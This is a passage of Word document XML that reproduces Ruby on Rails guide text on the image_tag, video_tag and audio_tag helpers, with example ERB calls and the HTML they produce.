        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can supply alternate text for the image which will be used if the user has images turned off in their browser. If you do not specify an alt text explicitly, it defaults to the file name of the file, capitalized and with no extension. For example, these two image tags would return the same code:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4943"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4F38124D" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E463E8D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>image_tag "home.gif"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37DA5D3F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>image_tag "home.gif", :alt</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Home"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3522FAB3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also specify a special size tag, in the format “{width}x{height}”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5183"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6D52FA61" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19F87FFE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1598444569"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>image_tag "home.gif", :size</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "50x20"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="235C438A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In addition to the above special tags, you can supply a final hash of standard </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options, such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:name</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AC12D4" w14:paraId="23B90E3F" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2597D8FB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>image_tag "home.gif", :alt</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Go Home",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D6BD279" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                          :id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "HomeImage",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C765C20" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                          :class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'nav_bar'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0D643977" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.1.5 Linking to Videos with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>video_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FD5502" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>video_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper builds an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;video&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tag to the specified file. By default, files are loaded from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/videos</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3215"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="35CE44FC" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09B31236" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1072042969"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>video_tag "movie.ogg"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="45394732" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Produces</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3815"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1360497A" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="416D263A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="616527525"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;video</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>src="/videos/movie.ogg"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>/&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6FEF8EF4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Like an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>image_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> you can supply a path, either absolute, or relative to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/videos</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory. Additionally you can specify the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:size =&gt; "#{width}x#{height}"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option just like an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>image_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Video tags can also have any of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options specified at the end (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> et al).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544C2B56" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The video tag also supports all of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;video&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options through the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options hash, including:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09277676" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:poster =&gt; 'image_name.png'</w:t>
      </w:r>
      <w:r>
        <w:t>, provides an image to put in place of the video before it starts playing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F835C7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autoplay =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t>, starts playing the video on page load.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5233F3E0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:loop =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t>, loops the video once it gets to the end.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1FB763" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:controls =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t>, provides browser supplied controls for the user to interact with the video.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11CB10BB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autobuffer =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t>, the video will pre load the file for the user on page load.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364D9F84" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can also specify multiple videos to play by passing an array of videos to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>video_tag</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5CA2FB0F" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5AED4CAA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1473979090"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>video_tag ["trailer.ogg", "movie.ogg"] %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="73865E77" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This will produce:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7990"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="104260C4" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04E2EA47" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="843671312"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;video&gt;&lt;source</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>src="trailer.ogg"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>/&gt;&lt;source</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>src="movie.ogg"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>/&gt;&lt;/video&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D86F0CE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.1.6 Linking to Audio Files with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>audio_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD0F21E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>audio_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper builds an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;audio&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tag to the specified file. By default, files are loaded from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/audios</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3215"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="725E13ED" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16E5363A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="359405572"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>audio_tag "music.mp3"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
